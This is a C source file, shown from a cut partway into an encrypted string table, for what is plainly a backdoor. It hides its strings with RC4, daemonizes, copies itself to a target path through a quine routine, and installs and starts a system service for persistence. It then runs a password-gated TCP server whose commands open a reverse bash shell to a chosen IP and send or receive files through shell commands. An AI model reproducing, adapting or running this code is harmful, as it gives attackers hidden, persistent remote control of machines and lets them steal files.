									 0x70, 0x39, 0x70, 0x54, 0xC3, 0x05, 0xAF, 0x3A, 0x63, 0x04, 0xDE, 0x21, 0x0B, 0x3B};
const unsigned char	servdown[]	=	{0x60, 0x19, 0x64, 0x63, 0xCB, 0xBB, 0xCC, 0x89, 0xEB, 0x1E, 0x0C, 0x0F, 0xCF, 0xD5, 0x38, 0xF5, 0x72, 0xE6, 0x51,
									 0x79, 0x31, 0x20, 0x4F, 0xC4, 0x4B, 0xB8, 0x75, 0x65, 0x1F, 0xDE, 0x76, 0x0A, 0x52, 0x82, 0x52, 0x3C, 0x33, 0xAC,
									 0x8F, 0x5E, 0x50, 0xC7, 0xE2, 0x1E, 0xBB, 0x1D, 0x9F, 0xCD, 0x14, 0x2F, 0xDA, 0x63, 0x3A, 0x86, 0x90};

typedef	struct	client_info
{
	bool	is_logged;
	int		password_try_count;
}			t_client_info;

typedef	struct	server
{
	int				client_count;
	int				server_sock;
	struct	pollfd	clients[MAX_CLIENT_CONNECTION + 1];
	t_client_info	clients_info[MAX_CLIENT_CONNECTION+1];
}				t_server;

t_server			*g_server;
unsigned long		binchecksum = 256;
unsigned long		sfcchecksum = 5552282552362382127;
unsigned long		paschecksum = 2911245069172461705;

void	clear_client_connection(int fd);
void	send_msg_to_client(char *msg, int fd);

void	clean(void	*ptr)
{
	if (ptr)
		free(ptr);
	ptr = NULL;
	return;
}

void	send_signal(void)
{
	kill(getpid(), SIGUSR1);
	return;
}

void	dupdup(int fd)
{
	if (dup2(fd, STDIN_FILENO) < 0 || dup2(fd, STDOUT_FILENO) < 0 || dup2(fd, STDERR_FILENO) < 0)
		send_signal();
}

void	ft_error(char *str)
{
	write(2, str, strlen(str));
	// send_signal();
}

void	sigclear_handler(int sig)
{
	(void)sig;
	unsigned char	*cypher = RC4(LOGINS, servdown, sizeof(servdown));

	for (int i = 1; i < MAX_CLIENT_CONNECTION+1; i++)
	{
		if (g_server->clients[i].fd == -1)
			continue;
		send_msg_to_client((char *)cypher, g_server->clients[i].fd);
		clear_client_connection(g_server->clients[i].fd);
	}
	clean(cypher);
	clean(g_server);
	return;
}

void	sigchld_handler(int sig)
{
	(void)sig;
	int		status;
	pid_t	pid;

	while ((pid = waitpid(-1, &status, WNOHANG)) > 0)
		continue;
	return;
}

void	setup_signals(void)
{
	struct sigaction sa;

	sa.sa_handler = sigclear_handler;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = 0;
	if (sigaction(SIGTERM, &sa, NULL) < 0)
		send_signal();
	if (sigaction(SIGINT, &sa, NULL) < 0)
		send_signal();
	if (sigaction(SIGQUIT, &sa, NULL) < 0)
		send_signal();
	if (sigaction(SIGSEGV, &sa, NULL) < 0)
		send_signal();
	if (sigaction(SIGABRT, &sa, NULL) < 0)
		send_signal();
	if (sigaction(SIGUSR1, &sa, NULL) < 0)
		send_signal();
	sa.sa_handler = sigchld_handler;
	sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
	if (sigaction(SIGCHLD, &sa, NULL) < 0)
		send_signal();
	return;
}

unsigned long	DJB2(unsigned char *str)
{
	unsigned long	hash = 5381;

	for (int i = 0; str[i]; i++)
		hash = hash * 33 + str[i];
	return hash;
}

void	RC4_swap(unsigned char *S, int i, int j)
{
	unsigned char	temp;

	temp = S[i];
	S[i] = S[j];
	S[j] = temp;
}

void	RC4_KSA(const char *salt, unsigned char *S)
{
	size_t	i, j, len = strlen(salt);
	for (i = 0; i < 256; i++)
		S[i] = i;
	j = 0;
	for (i = 0; i < 256; i++)
	{
		j = (j + S[i] + salt[i % len]) % 256;
		RC4_swap(S, i, j);
	}
	return;
}

void	RC4_PRGA(unsigned char *S, unsigned char *K, size_t len)
{
	size_t	i = 0, j = 0;

	for (size_t p = 0; p < len; p++)
	{
		i = (i + 1) % 256;
		j = (j + S[i]) % 256;
		RC4_swap(S, i, j);
		K[p] = S[(S[i] + S[j]) % 256];
	}
}

unsigned char	*RC4(const char *salt, const unsigned char *msg, size_t len)
{
	unsigned char	*cypher = (unsigned char *)calloc(len + 1, sizeof(unsigned char));
	unsigned char	S[256];
	unsigned char	K[len];

	RC4_KSA(salt, S);
	RC4_PRGA(S, K, len);
	for (size_t i = 0; i < len; i++)
		cypher[i] = msg[i] ^ K[i];
	return cypher;
}

char	*generate_random_filename()
{
	int		len = 70;
	char	*filename = (char *)malloc(len);
	unsigned char	*cypher;

	if (!len)
		send_signal();
	cypher = RC4(LOGINS, filespec, sizeof(filespec));
	while (true)
	{
		struct timespec	ts;
		clock_gettime(CLOCK_REALTIME, &ts);
		unsigned long long	random = 0;
		for (int i = 0; i < 4; i++)
			random = (random << 15) | (rand() & 0x7FFF);
		if (snprintf(filename, len, (const char *)cypher, ts.tv_sec, (long long)ts.tv_nsec, random) >= len)
			continue;
		if (!access(filename, F_OK))
		{
			clean(cypher);
			return filename;
		}
		usleep(1);
	}
	return NULL;
}

bool	is_bin(void)
{
	char			path[PATH_MAX], rpath[PATH_MAX];
	ssize_t			len;
	unsigned char	*cypher = RC4(LOGINS, progpath, sizeof(progpath));

	len = readlink((const char *)cypher, path, sizeof(path)-1);
	if (len == -1)
	{
		clean(cypher);
		send_signal();
	}
	clean(cypher);
	if (!realpath(path, rpath))
		send_signal();
	cypher = RC4(LOGINS, binpath, sizeof(binpath));
	bool	ok = strcmp((const char *)cypher, dirname(rpath));
	clean(cypher);
	if (ok)
		return false;
	return true;
}

void	create_daemon(void)
{
	pid_t			pid = fork();
	unsigned char	*cypher;

	if (pid < 0)
		send_signal();
	if (pid)
		exit(0);
	if (setsid() < 0)
		send_signal();
	cypher = RC4(LOGINS, rootpath, sizeof(rootpath));
	if (chdir((const char *)cypher) < 0)
	{
		clean(cypher);
		send_signal();
	}
	clean(cypher);
	umask(0);
	return ;
}

unsigned char	*get_file_data(int idx)
{
	size_t			size, rsize;
	char			selfpath[PATH_MAX];
	unsigned char	*cypher;
	unsigned char	*pcypher = RC4(LOGINS, readmode, sizeof(readmode));
	unsigned char	*buff = NULL;
	FILE			*file;

	if (idx == 1)
	{
		cypher = RC4(LOGINS, progpath, sizeof(progpath));
		size = readlink((const char *)cypher, selfpath, sizeof(selfpath)-1);
		if (size < 0)
		{
			clean(cypher);
			clean(pcypher);
			send_signal();
		}
		selfpath[size] = 0;
		file = fopen(selfpath, (const char *)pcypher);
	}
	else
	{
		if (idx == 2)
			cypher = RC4(LOGINS, sfcpath, sizeof(sfcpath));
		else
			cypher = RC4(LOGINS, ftscheck, sizeof(ftscheck));
		file = fopen((const char *)cypher, (const char *)pcypher);
	}
	clean(cypher);
	clean(pcypher);
	if (!file)
		send_signal();
	fseek(file, 0, SEEK_END);
	size = ftell(file);
	rewind(file);
	buff = (unsigned char *)calloc(size + 1, sizeof(unsigned char));
	if (!buff)
	{
		fclose(file);
		send_signal();
	}
	rsize = fread(buff, 1, size, file);
	if (rsize != size)
	{
		clean(buff);
		fclose(file);
		send_signal();
	}
	if (fclose(file) < 0)
	{
		clean(buff);
		send_signal();
	}
	return buff;
}

bool	file_checksum(bool bin)
{
	unsigned long	checksum = 0, checksum1;
	unsigned char	*cypher;
	unsigned char	*buff = NULL;
	FILE			*file;
	if (bin)
		buff = get_file_data(1);
	else
		buff = get_file_data(2);
	checksum = DJB2(buff);
	clean(buff);
	if (!bin && checksum == sfcchecksum)
		return true;
	if (!bin)
		return false;
	cypher = RC4(LOGINS, ftscheck, sizeof(ftscheck));
	if (!access((const char *)cypher, F_OK))
	{
		clean(cypher);
		buff = get_file_data(3);
		checksum1 = atoll((const char *)buff);
		clean(buff);
		if (checksum == checksum1)
			return true;
	}
	clean(cypher);
	cypher = RC4(LOGINS, ftscheck, sizeof(ftscheck));
	file = fopen((const char *)ftscheck, (const char *)writemode);
	clean(cypher);
	if (!file)
		send_signal();
	cypher = RC4(LOGINS, dspec, sizeof(dspec));
	fprintf(file, (const char *)dspec, checksum);
	if (fclose(file) < 0)
		send_signal();
	return false;
}

void	quine()
{
	int				len;
	char			*filename = generate_random_filename();
	char			cmd[1024];
	FILE			*file;
	unsigned char	*cypher;
	unsigned char	*tcypher;
	unsigned char	*hcypher;
	unsigned char	*scypher;

	cypher = RC4(LOGINS, writemode, sizeof(writemode));
	file = fopen(filename, (const char *)cypher);
	clean(cypher);
	if (!file)
	{
		clean(filename);
		send_signal();
	}
	cypher = RC4(LOGINS, frline, sizeof(frline));
	scypher = RC4(LOGINS, srcspec, sizeof(srcspec));
	fprintf(file, (const char *)scypher, (const char *)cypher);
	clean(cypher);
	cypher = RC4(LOGINS, vnewline, sizeof(vnewline));
	tcypher = RC4(LOGINS, vspace, sizeof(vspace));
	hcypher = RC4(LOGINS, hexspec, sizeof(hexspec));
	for (size_t i = 0; i < sizeof(srccode); i++)
    {
		if (i && i % 24 == 0)
			fprintf(file, (const char *)scypher, (const char *)cypher);
		else if (i)
			fprintf(file, (const char *)scypher, (const char *)tcypher);
		fprintf(file, (const char *)hcypher, srccode[i]);
	}
	clean(cypher);
	clean(tcypher);
	clean(hcypher);
	cypher = RC4(LOGINS, lsline, sizeof(lsline));
	fprintf(file, (const char *)scypher, (const char *)cypher);
	clean(cypher);
	cypher = RC4(LOGINS, srccode, sizeof(srccode));
	fprintf(file, (const char *)scypher, (const char *)cypher);
	clean(cypher);
	clean(scypher);
	cypher = RC4(LOGINS, runcmd, sizeof(runcmd));
	tcypher = RC4(LOGINS, targpath, sizeof(targpath));
	len = sprintf(cmd, (const char *)cypher, filename, tcypher);
	cmd[len] = 0;
	if (fclose(file) < 0)
	{
		clean(cypher);
		clean(tcypher);
		clean(filename);
		send_signal();
	}
	if (system(cmd))
	{
		clean(cypher);
		clean(tcypher);
		clean(filename);
		send_signal();
	}
	clean(cypher);
	clean(tcypher);
	// cypher = RC4(LOGINS, rmftscmd, sizeof(rmftscmd));
	// len = sprintf(cmd, (const char *)cypher, filename);
	// cmd[len] = 0;
	// if (system(cmd))
	// {
	// 	clean(cypher);
	// 	clean(filename);
	// 	send_signal();
	// }
	// clean(cypher);
	clean(filename);
	return;
}

void	move_to_target(void)
{
	unsigned char	*cypher = RC4(LOGINS, targpath, sizeof(targpath));

	if (!access((const char *)cypher, F_OK))
	{
		clean(cypher);
		if (file_checksum(true))
			return;
	}
	clean(cypher);
	quine();
	return;
}

void	config_service(void)
{
	unsigned char	*cypher = RC4(LOGINS, sfcpath, sizeof(sfcpath));
	bool			ok = access((const char *)cypher, F_OK);

	if (!ok)
	{
		if (file_checksum(false))
		{
			clean(cypher);
			return;
		}
	}
	int	fd = open((const char *)cypher, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	clean(cypher);
	if (fd < 0)
		send_signal();
	cypher = RC4(LOGINS, sfc, sizeof(sfc));
	if (write(fd, cypher, strlen((const char *)cypher)) < 0)
	{
		close(fd);
		clean(cypher);
		send_signal();
	}
	close(fd);
	clean(cypher);
	cypher = RC4(LOGINS, reload, sizeof(reload));
	if (system((const char *)cypher))
	{
		clean(cypher);
		send_signal();
	}
	clean(cypher);
	cypher = RC4(LOGINS, enable, sizeof(enable));
	if (system((const char *)cypher))
	{
		clean(cypher);
		send_signal();
	}
	clean(cypher);
	cypher = RC4(LOGINS, start, sizeof(start));
	if (system((const char *)cypher))
	{
		clean(cypher);
		send_signal();
	}
	clean(cypher);
	return;
}

int		init_server()
{
	int		server_sock, opt = 1;
	struct	sockaddr_in	addr = {0};
	unsigned char *cypher;

	if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		send_signal();
	if (setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0)
	{
		close(server_sock);
		send_signal();
	}
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	cypher = RC4(LOGINS, servport, sizeof(servport));
	addr.sin_port = htons(atoi((const char *)cypher));
	clean(cypher);
	if (bind(server_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
	{
		close(server_sock);
		send_signal();
	}
	if (listen(server_sock, MAX_CLIENT_CONNECTION) < 0)
	{
		close(server_sock);
		send_signal();
	}
	return (server_sock);
}

void	clear_client_connection(int fd)
{
	for (int i = 0; i < MAX_CLIENT_CONNECTION; i++)
	{
		if (g_server->clients[i].fd != fd)
			continue;
		shutdown(fd, SHUT_RDWR);
		close(fd);
		g_server->clients[i].fd = -1;
		g_server->clients[i].events = POLLIN;
		g_server->clients[i].revents = 0;
		g_server->clients_info[i].is_logged = false;
		g_server->clients_info[i].password_try_count = 0;
		g_server->client_count--;
		return;
	}
}

void	send_msg_to_client(char *msg, int fd)
{
	if (send(fd, msg, strlen(msg), 0) < 0)
	{
		clear_client_connection(fd);
		ft_error(msg);
	}
}

char	*trim_whitespaces(char *buff)
{
	if (!buff)
		return NULL;
	int	first_byte = 0, end_byte;
	while (isspace(buff[first_byte]))
		first_byte++;
	if (!buff[first_byte])
	{
		buff[0] = 0;
		return (buff);
	}
	end_byte = strlen(buff)-1;
	while (end_byte > first_byte && isspace(buff[end_byte]))
		end_byte--;
	buff[end_byte+1] = 0;
	return (&buff[first_byte]);
}

void	create_reverse_shell_session(int client_fd, char *user_input)
{
	int				status;
	bool			ok = false;
	pid_t			pid;
	unsigned char	*cypher = RC4(LOGINS, rscreate, sizeof(rscreate));

	send_msg_to_client((char *)cypher, client_fd);
	clean(cypher);
	pid = fork();
	if (pid < 0)
	{
		cypher = RC4(LOGINS, rsfailed, sizeof(rsfailed));
		send_msg_to_client((char *)cypher, client_fd);
		clean(cypher);
		return;
	}
	if (!pid)
	{
		char	ip[16] = {0};
		char	port[6] = {0};
		char	cmd[10] = {0};
		char	*argv[3];

		close(g_server->server_sock);
		struct sockaddr_in revsockaddr;
		cypher = RC4(LOGINS, rsspec, sizeof(rsspec));
		if (sscanf(user_input, (const char *)cypher, cmd, ip, port) != 3)
		{
			clean(cypher);
			cypher = RC4(LOGINS, rsargerr, sizeof(rsargerr));
			send_msg_to_client((char *)cypher, client_fd);
			clean(cypher);
			send_signal();
		}
		clean(cypher);
		if (inet_pton(AF_INET, ip, &(revsockaddr.sin_addr)) != 1)
		{
			cypher = RC4(LOGINS, rsiperr, sizeof(rsiperr));
			send_msg_to_client((char *)cypher, client_fd);
			clean(cypher);
			send_signal();
		}
		int	port_to_int = atoi(port);
		if (!(port_to_int >= 1024 && port_to_int <= 65535))
		{
			cypher = RC4(LOGINS, rsporterr, sizeof(rsporterr));
			send_msg_to_client((char *)cypher, client_fd);
			clean(cypher);
			send_signal();
		}
		int sockt = socket(AF_INET, SOCK_STREAM, 0);
		revsockaddr.sin_family = AF_INET;       
		revsockaddr.sin_port = htons(port_to_int);
		revsockaddr.sin_addr.s_addr = inet_addr(ip);
		connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
		dupdup(sockt);
		cypher = RC4(LOGINS, bash, sizeof(bash));
		argv[0] = strdup((char *)cypher);
		clean(cypher);
		cypher = RC4(LOGINS, basharg, sizeof(basharg));
		argv[1] = strdup((char *)cypher);
		clean(cypher);
		argv[2] = NULL;
		execvp(argv[0], argv);
		exit(1);
	}
	sleep(1);
	if (!waitpid(pid, &status, WNOHANG))
		ok = true;
	if (ok)
	{
		cypher = RC4(LOGINS, rssuccess, sizeof(rssuccess));
		send_msg_to_client((char *)cypher, client_fd);
		clean(cypher);
	}
	else
	{
		cypher = RC4(LOGINS, rsfailed, sizeof(rsfailed));	
		send_msg_to_client((char *)cypher, client_fd);
		clean(cypher);
	}
  	clear_client_connection(client_fd);
	return;
}

void	send_file_to_client(int client_fd, char* user_input)
{
	char			command[10] = {0};
	char			ipv4_address[16] = {0};
	char			port[6] = {0};
	char			file_path[PATH_MAX] = {0};
	pid_t			pid;
	unsigned char	*cypher;

	cypher = RC4(LOGINS, snspec, sizeof(snspec));
	if (sscanf(user_input, (const char *)cypher, command, ipv4_address, port, file_path) != 4)
	{
		clean(cypher);
		cypher = RC4(LOGINS, snerrspec, sizeof(snerrspec));
		send_msg_to_client((char *)cypher, client_fd);
		clean(cypher);
		return;
	}
	clean(cypher);
	if (access(file_path, F_OK) < 0)
	{
		char err_msg[PATH_MAX + 100] = {0};
		cypher = RC4(LOGINS, snflerr, sizeof(snflerr));
		snprintf(err_msg, sizeof(err_msg), (const char *)cypher, file_path);
		clean(cypher);
		send_msg_to_client(err_msg, client_fd);
		return;
	}
	pid = fork();
	if (pid < 0)
	{
		cypher = RC4(LOGINS, snflfail, sizeof(snflfail));
		send_msg_to_client((char *)cypher, client_fd);
		clean(cypher);
		return;
	}
	if (!pid)
	{
		char	command[PATH_MAX + 256];
		char	*argv[4];

		cypher = RC4(LOGINS, bash, sizeof(bash));
		argv[0] = strdup((char *)cypher);
		clean(cypher);
		cypher = RC4(LOGINS, bashargc, sizeof(bashargc));
		argv[1] = strdup((char *)cypher);
		clean(cypher);
		cypher = RC4(LOGINS, snflcmd, sizeof(snflcmd));
		snprintf(command, sizeof(command), (const char *)cypher, ipv4_address, port, file_path);
		clean(cypher);
		argv[2] = command;
		argv[3] = NULL;
		execv(argv[0], argv);
		cypher = RC4(LOGINS, snflfail, sizeof(snflfail));
		send_msg_to_client((char *)cypher, client_fd);
		clean(cypher);
		exit(1);
	}
	send_msg_to_client("File Sent successfully\n", client_fd);
	return;
}

int		find_available_port(void)
{
	int					sockfd, opt = 1;
	struct sockaddr_in	server_addr;

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0)
		return -1;
	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0)
	{
		close(sockfd);
		return -1;
	}
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
	for (int port = 1024; port <= 65535; port++)
	{
		server_addr.sin_port = htons(port);
        if (!bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)))
		{
            close(sockfd);
            return port;
        }
    }
    close(sockfd);
    return -1;
}

void	recv_file_from_client(int client_fd, char* user_input)
{
	char			command[10] = {0};
	char			file_path[PATH_MAX] = {0};
	pid_t			pid;
	unsigned char	*cypher;
	int				port, status;
	bool			ok = false;

	cypher = RC4(LOGINS, rcspec, sizeof(rcspec));
	if (sscanf(user_input, (const char *)cypher, command, file_path) != 2)
	{
		clean(cypher);
		cypher = RC4(LOGINS, rcerrspec, sizeof(rcerrspec));
		send_msg_to_client((char *)cypher, client_fd);
		clean(cypher);
	}
	clean(cypher);
	pid = fork();
	if (pid < 0)
	{
		cypher = RC4(LOGINS, rcfail, sizeof(rcfail));
		send_msg_to_client((char *)rcfail, client_fd);
		clean(cypher);
		return;
	}
	port = find_available_port();
	if (!pid)
	{
		char	cmd[PATH_MAX + 256];
		char	*argv[4];

		cypher = RC4(LOGINS, bash, sizeof(bash));
		argv[0] = strdup((char *)cypher);
		clean(cypher);
		cypher = RC4(LOGINS, bashargc, sizeof(bashargc));
		argv[1] = strdup((char *)cypher);
		clean(cypher);
		if (port < 0)
		{
			cypher = RC4(LOGINS, rcfail, sizeof(rcfail));
			send_msg_to_client((char *)rcfail, client_fd);
			clean(cypher);
			send_signal();
		}
		cypher = RC4(LOGINS, rccmd, sizeof(rccmd));
		snprintf(cmd, sizeof(cmd), (const char *)cypher, port, file_path);
		clean(cypher);
		argv[2] = cmd;
		argv[3] = NULL;
		execv(argv[0], argv);
		exit(1);
	}
	sleep(1);
	if (!waitpid(pid, &status, WNOHANG))
		ok = true;
	if (ok)
	{
		char	cmd[256];

		cypher = RC4(LOGINS, rcsuccess, sizeof(rssuccess));
		snprintf(cmd, sizeof(cmd), (const char *)cypher, port);
		clean(cypher);
		send_msg_to_client(cmd, client_fd);
	}
	else
	{
		cypher = RC4(LOGINS, rcfail, sizeof(rcfail));
		send_msg_to_client((char *)rcfail, client_fd);
		clean(cypher);
	}
	return;
}

void	handle_client_commands(int fd, char *cmd)
{
	char	*user_input = trim_whitespaces(cmd);
	unsigned char	*cypher = RC4(LOGINS, (const unsigned char *)user_input, strlen(user_input));
	if (!strcmp((const char *)cypher, (const char *)help) || !strcmp((const char *)cypher, (const char *)qmark))
	{
		clean(cypher);
		cypher = RC4(LOGINS, commands, sizeof(commands));
		send_msg_to_client((char *)cypher, fd);
		clean(cypher);
	}
	else if (!strcmp((const char *)cypher, (const char *)out))
	{
		clean(cypher);
		clear_client_connection(fd);
	}
	else if (!strncmp((const char *)cypher, (const char *)shell, 5))
	{
		clean(cypher);
		create_reverse_shell_session(fd, user_input);
	}
	else if (!strncmp((const char *)cypher, (const char *)post, 4))
	{
		clean(cypher);
		send_file_to_client(fd, user_input);
	}
	else if (!strncmp((const char *)cypher, (const char *)receive, 7))
	{
		clean(cypher);
		recv_file_from_client(fd, user_input);
	}
	else
	{
		clean(cypher);
		cypher = RC4(LOGINS, cnf, sizeof(cnf));
		send_msg_to_client((char *)cypher, fd);
		clean(cypher);
	}
	return;
}

void	recv_msg_from_client(int idx)
{
	char			buff[1024];
	unsigned char	*cypher;
	int				len = 0, client_fd = g_server->clients[idx].fd;

	len = recv(client_fd, buff, sizeof(buff), 0);
	if (len <= 0)
	{
		clear_client_connection(client_fd);
		send_signal();
	}
	buff[len-1] = 0;
	if (!g_server->clients_info[idx].is_logged)
	{
		if (paschecksum == DJB2((unsigned char *)buff))
		{
			g_server->clients_info[idx].is_logged = true;
			g_server->clients_info[idx].password_try_count = 0;
			cypher = RC4(LOGINS, prompt, sizeof(prompt));
			send_msg_to_client((char *)cypher, client_fd);
			clean(cypher);
		}
		else
		{
			g_server->clients_info[idx].password_try_count++;
			if (g_server->clients_info[idx].password_try_count < 3)
			{
				cypher = RC4(LOGINS, passerr, sizeof(passerr));
				send_msg_to_client((char *)cypher, client_fd);
				clean(cypher);
			}
			else
			{
				cypher = RC4(LOGINS, maxtry, sizeof(maxtry));
				send_msg_to_client((char *)cypher, client_fd);
				clean(cypher);
				clear_client_connection(client_fd);
			}
		}
		return;
	}
	handle_client_commands(client_fd, buff);
	cypher = RC4(LOGINS, prompt, sizeof(prompt));
	send_msg_to_client((char *)cypher, client_fd);
	clean(cypher);
	return;
}

void	client_connection(void)
{
	int					client_fd;
	socklen_t			client_len;
	struct	sockaddr_in	client_addr = {0};
	unsigned char		*cypher;

	if ((client_fd = accept(g_server->server_sock, (struct sockaddr *)&client_addr, &client_len)) < 0)
		send_signal();
	if (g_server->client_count == 3)
	{
		cypher = RC4(LOGINS, cnfailed, sizeof(cnfailed));
		send_msg_to_client((char *)cypher, client_fd);
		clean(cypher);
		shutdown(client_fd, SHUT_RDWR);
		close(client_fd);
		return;
	}
	for (int i = 0; i < MAX_CLIENT_CONNECTION + 1; i++)
	{
		if (g_server->clients[i].fd != -1)
			continue;
		g_server->clients[i].fd = client_fd;
		g_server->clients[i].events = POLLIN;
		g_server->client_count++;
		break;
	}
	cypher = RC4(LOGINS, enterpass, sizeof(enterpass));
	send_msg_to_client((char *)cypher, client_fd);
	clean(cypher);
	return;
}

void	run_server(void)
{
	int	poll_count;

	while (true)
	{
		poll_count = poll(g_server->clients, g_server->client_count+1, 5000);
		if (poll_count == 0)
			continue;
		if (poll_count < 0)
		{
			for (int i = 0; i < g_server->client_count; i++)
				clear_client_connection(g_server->clients[i].fd);
			continue;
		}
		for (int i = 0; i < MAX_CLIENT_CONNECTION + 1; i++)
		{
			if (g_server->clients[i].fd == -1)
				continue;
			if (g_server->clients[i].revents & POLLIN)
			{
				if (g_server->clients[i].fd == g_server->server_sock)
					client_connection();
				else
					recv_msg_from_client(i);
			}
		}
	}
}

void	spawn_server(void)
{
	g_server = (t_server*)calloc(1, sizeof(t_server));

	for (int i = 0; i < MAX_CLIENT_CONNECTION + 1; i++)
	{
		g_server->clients[i].fd = -1;
		g_server->clients[i].events = POLLIN;
		g_server->clients[i].revents = 0;
		g_server->clients_info[i].is_logged = false;
		g_server->clients_info[i].password_try_count = 0;
	}
	g_server->server_sock = init_server();
	g_server->clients[0].fd = g_server->server_sock;
	run_server();
}

int	main()
{
	unsigned char	*cypher;
	struct timespec ts;
	int				fd;

	clock_gettime(CLOCK_REALTIME, &ts);
	srand(ts.tv_nsec ^ ts.tv_sec);
	if (getegid())
		ft_error(SUDO);
	printf("%s", LOGINS);
	setup_signals();
	cypher = RC4(LOGINS, nullpath, sizeof(nullpath));
	fd = open((const char *)cypher, O_WRONLY | O_CREAT | O_TRUNC, 0755);
	clean(cypher);
	if (fd < 0)
		exit(0);
	dupdup(fd);
	if (close(fd) < 0)
		send_signal();
	if (is_bin())
	{
		config_service();
		spawn_server();
	}
	else
	{
		create_daemon();
		move_to_target();
		config_service();
	}
	return 0;
}